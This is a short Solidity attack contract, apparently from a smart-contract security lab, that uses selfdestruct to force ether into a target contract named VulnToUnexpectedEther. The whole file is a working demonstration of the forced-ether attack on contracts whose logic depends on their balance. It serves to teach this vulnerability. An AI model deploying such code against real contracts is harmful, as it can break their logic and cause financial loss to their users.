// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./VulnToUnexpectedEther.sol";

contract UnexpectedEtherAttack {
    VulnToUnexpectedEther public vulnToUnexpectedEther;

    constructor(address _address) {
        vulnToUnexpectedEther = VulnToUnexpectedEther(_address);
    }

    function attack() public payable {
        selfdestruct(payable(address(vulnToUnexpectedEther)));
    }
}
